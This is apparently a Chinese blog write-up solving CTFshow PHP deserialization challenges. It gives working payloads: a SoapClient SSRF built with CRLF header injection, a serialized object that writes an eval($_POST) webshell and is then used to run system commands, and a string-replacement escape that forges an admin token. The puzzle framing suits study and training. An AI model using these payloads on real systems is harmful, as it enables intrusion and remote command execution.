<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public SoapClient::SoapClient ( mixed $wsdl [,<span class="built_in"> array </span>$options ] )</span><br><span class="line"></span><br><span class="line">第一个参数是用来指明是否是wsdl模式</span><br><span class="line">如果为null，那就是非wsdl模式，反序列化的时候会对第二个参数指明的url进行soap请求</span><br><span class="line"></span><br><span class="line">如果第一个参数为null，则第二个参数必须设置location和uri</span><br><span class="line">  其中location是将请求发送到的SOAP服务器的URL</span><br><span class="line">  uri是SOAP服务的目标名称空间</span><br><span class="line"></span><br><span class="line">第二个参数允许设置user_agent选项来设置请求的user-agent头</span><br><span class="line"></span><br><span class="line">SoapClient发出的请求包的user_agent是完全可控的，结合CRLF注入可以构造一个完全可控的POST请求，因为POST请求最关键的Content-Length和Content-Type都在user_agent之下</span><br><span class="line"></span><br><span class="line">如果是GET请求，就简单得多，只需要构造好location就可以了。</span><br><span class="line">此题要post ：token</span><br></pre></td></tr></table></figure>

<p>所以，我们只需要构造满足条件的SoapClient类，序列化后传入vip参数即可。这里面还涉及了CRLF的利用，用于在user-agent头部进行注入，所以最终的脚本如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;feng\r\nx-forwarded-for:127.0.0.1,127.0.0.1\r\nContent-type:application/x-www-form-urlencoded\r\nContent-length:13\r\n\r\ntoken=ctfshow&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;feng&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span></span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#$c = unserialize($b);</span></span><br><span class="line"><span class="comment">#$c-&gt;not_a_function();//调用不存在的方法，让SoapClient调用__call</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<p>location就是我们要访问的url，其中uri也是不可缺少的，但是其实没什么用。关键就是因为我们可以控制user_agent，所以可以CRLF注入，CRLF注入可以参考：</p>
<pre><code>User-Agent: feng
x-forwarded-for:127.0.0.1,127.0.0.1
Content-type:application/x-www-form-urlencoded
Content-length:13

token=ctfshow
Content-Type: text/xml; charset=utf-8
SOAPAction: &quot;feng#not_a_function&quot;
Content-Length: 378

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;feng&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:not_a_function/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;
</code></pre>
<p>因为Content-length的缘故，post只取到token=ctfshow，成功把下面的那些东西给吃掉了，实现了自己构造POST的请求包。</p>
<p>然后再访问flag.txt即可。<br><a target="_blank" rel="noopener" href="https://dar1in9s.github.io/2020/04/02/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/#SoapClient-call%E6%96%B9%E6%B3%95%E8%BF%9B%E8%A1%8CSSRF">php原生类的反序列化利用</a></p>
<h3 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h3><p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220320220527530.png" alt="image-20220320220527530"></p>
<p>get传入<code>ctfshow=ctfshow_i_love_36D</code>就拿到了</p>
<p>是对传入的字符串进行序列化，字符串<strong>序列化</strong>后就是其本身,然后检测有没 ctfshow_i_love_36D</p>
<h3 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h3><p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220320220927166.png" alt="image-20220320220927166"></p>
<p>在php7.4以上：如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。当反序列化时会进入__unserialize中<br>而且也没有什么方法可以进入到__invoke中，所以无法利用危险函数eval，所以直接就朝着写文件搞就可以了。</p>
<p>在destruct()函数中，有file_put_contents可以写入文件，一句话木马</p>
<p>$this-&gt;code==0x36d是<strong>弱类型比较</strong>，0x36d又有没有打引号，所以代表数字，且数字是877，那么<code>877a</code>，<code>877.php</code>等可以通过比较；所以<code>设置username=&#39;877.php&#39;</code>来通过比较</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;877.php&#x27;</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="number">0x36d</span>; <span class="comment">//此处赋值了就可以不用construct函数</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="variable">$a</span>=<span class="keyword">new</span> ctfshowvip();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml">传参：</span></span><br><span class="line"><span class="xml">?vip=O:10:&quot;ctfshowvip&quot;:3:&#123;s:8:&quot;username&quot;;s:7:&quot;877.php&quot;;s:8:&quot;password&quot;;s:24:&quot;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><span class="xml">&quot;;s:4:&quot;code&quot;;i:877;&#125;</span></span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$p</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">&#x27;877.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> ctfshowvip));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfshowvip(<span class="string">&#x27;877.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>访问877.php，执行命令执行</p>
<p>1=system(‘ls /‘);</p>
<p>1=system(‘cat /flag_is_here’);</p>
<h3 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h3><p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220321124857594.png" alt="image-20220321124857594"></p>
<p>这道题会根据传入的参数生成message对象，并经过序列化、替换和base64编码后作为cookie返回</p>
<p>注释里面有点message.php</p>
<p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220321125321631.png" alt="image-20220321125321631"></p>
<p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220321125943170.png" alt="image-20220321125943170"></p>
<p>拿到flag的条件是<code>$msg-&gt;token==&#39;admin&#39;</code>,但题中<code>token</code>的值是<code>user</code>,再看<code>$umsg = str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg))</code>这个替换语句，将$msg序列化后，4个字符长度的<code>fuck</code>替换成5个字符长度<code>loveU</code>。然后进行base64加密，传入cookie命名为msg，再将cookie传入的值msg进行base64解码，并进行反序列化，最后拿去比较<code>token==&#39;admin&#39;</code></p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php在反序列化时，底层代码是以 <span class="comment">; 作为字段的分隔，以 &#125; 作为结尾，并且是根据长度判断内容的 ，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化 。</span></span><br></pre></td></tr></table></figure>

<p>要让判断<code>token==&#39;admin&#39;</code>，序列化的形式应该这样：<code>O:7:&quot;message&quot;:1:&#123;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code>反序列化出来就是<code>class message&#123; public $token=&#39;admin&#39;;&#125;</code></p>
<p>//<code>s:5:&quot;token&quot;;s:5:&quot;admin&quot;;</code>共<strong>24</strong>个字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>=<span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>=<span class="string">&#x27;m&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$msg</span>= serialize(<span class="keyword">new</span> message);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$msg</span>;</span><br><span class="line">output：  </span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;message&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;from&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;d&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;msg&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;m&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;to&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>构造方法是并没有对<code>$token</code>的值进行处理，所以重点在于字符串替换里面，两个字符串的长度不一样。我们可以利用$to这个变量，利用PHP反序列化的特点，即}，将s:5:”token”;s:4:”user”;分隔开，然后将</p>
<p><code>s:5:&quot;token&quot;;s:5:&quot;admin&quot;;</code>放进去，所以我们进行构造，注意闭合</p>
<p><code>&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code> 这一共<strong>27</strong>个字符长度就是我们需要插入的字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>=<span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>=<span class="string">&#x27;m&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>=<span class="string">&#x27;1&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$msg</span>= serialize(<span class="keyword">new</span> message);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$msg</span>;</span><br><span class="line"></span><br><span class="line">output：  </span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;message&quot;</span>:<span class="number">4</span>:O:<span class="number">7</span>:<span class="string">&quot;message&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;from&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;d&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;msg&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;m&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;to&quot;</span>;s:<span class="number">28</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:4:&quot;</span>user<span class="string">&quot;;&#125;  </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>但是这个output不能直接使用，因为<code>s:2:&quot;to&quot;;s:28:&quot;1&quot;;</code>,这里会让PHP默认<code>to</code>的值为1，但长度出错了</p>
<p>这时候我们就可以用前面的<code>str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));</code>语句,<code>loveU</code>有五个字符，但是前面的数字为<code>4</code>。在这个例子中，每一次替换可以逃逸一个字符,字符串替换后只会造成最后一位字符逃逸（<code>fuck</code>变为<code>loveU</code>把注入的最后一位挤出去了，如果<code>&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code>被抵出去了，那么就能够恰好的满足反序列化的条件了。</p>
<p>所以，有多少个fuck就会抵出去多少个位置；就需要<code>len(&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;)</code>个fuck，也就是27个</p>
<p>先序列化后替换，利用<code>loveU</code>替。换<code>fuck</code>补充这27的差值，一个fuck比一个loveU多一个长度，27个fuck就会多出27个长度</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>=<span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>=<span class="string">&#x27;m&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>=<span class="string">&#x27;1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$msg</span>= serialize(<span class="keyword">new</span> message);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$msg</span>;</span><br><span class="line"></span><br><span class="line">output：  </span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;message&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;from&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;d&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;msg&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;m&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;to&quot;</span>;s:<span class="number">136</span>:<span class="string">&quot;1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:4:&quot;</span>user<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">替换后：</span></span><br><span class="line"><span class="string">O:7:&quot;</span>message<span class="string">&quot;:4:&#123;s:4:&quot;</span><span class="keyword">from</span><span class="string">&quot;;s:1:&quot;</span>d<span class="string">&quot;;s:3:&quot;</span>msg<span class="string">&quot;;s:1:&quot;</span>m<span class="string">&quot;;s:2:&quot;</span>to<span class="string">&quot;;s:136:&quot;</span><span class="number">1</span>loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此时<code>to</code>的值就不会出错了</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:<span class="number">2</span>:<span class="string">&quot;to&quot;</span>;s:<span class="number">136</span>:<span class="string">&quot;1loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">因为有&#125;，所以<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:4:&quot;</span>user<span class="string">&quot;;&#125;这一段就被自动分隔开了</span></span><br><span class="line"><span class="string">序列化后token=admin</span></span><br></pre></td></tr></table></figure>

<p>所以即使题目默认<code>$token=&#39;user&#39;</code>,也可以使用替换来进行长度变化</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ge<span class="variable">t:</span></span><br><span class="line">?<span class="keyword">f</span>=<span class="number">1</span>&amp;<span class="keyword">m</span>=<span class="number">2</span>&amp;t=<span class="number">6</span>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="comment">&quot;;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h3><p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220321194502667.png" alt="image-20220321194502667"></p>
<p>访问<a target="_blank" rel="noopener" href="http://www.zip下载源码/">www.zip下载源码</a></p>
<p>index.php:<img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220321200050553.png" alt="image-20220321200050553"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	session_start();</span><br><span class="line">	<span class="comment">//超过5次禁止登陆</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line">		<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 setcookie(<span class="string">&quot;limit&quot;</span>,base64_encode(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line">		 <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">check.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;inc/inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$GET</span> = <span class="keyword">array</span>(<span class="string">&quot;u&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="string">&quot;pass&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$GET</span>)&#123;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$data</span>= <span class="variable">$db</span>-&gt;get(<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">	[	<span class="string">&#x27;id&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;UserName0&#x27;</span></span><br><span class="line">	],[</span><br><span class="line">		<span class="string">&quot;AND&quot;</span>=&gt;[</span><br><span class="line">		<span class="string">&quot;UserName0[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;u&#x27;</span>],</span><br><span class="line">		<span class="string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;pass&#x27;</span>] <span class="comment">//密码必须为128位大小写字母+数字+特殊符号，防止爆破</span></span><br><span class="line">		]</span><br><span class="line">	]);                      <span class="comment">//调用数据库</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line">		<span class="comment">//登陆成功取消次数累计</span></span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;success&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;欢迎您&quot;</span>.<span class="variable">$data</span>[<span class="string">&#x27;UserName0&#x27;</span>]));</span><br><span class="line">		                                                <span class="comment">//成功进入会出现  欢迎您</span></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;                         </span><br><span class="line">		<span class="comment">//登陆失败累计次数加1</span></span><br><span class="line">		<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>])+<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;登陆失败&quot;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

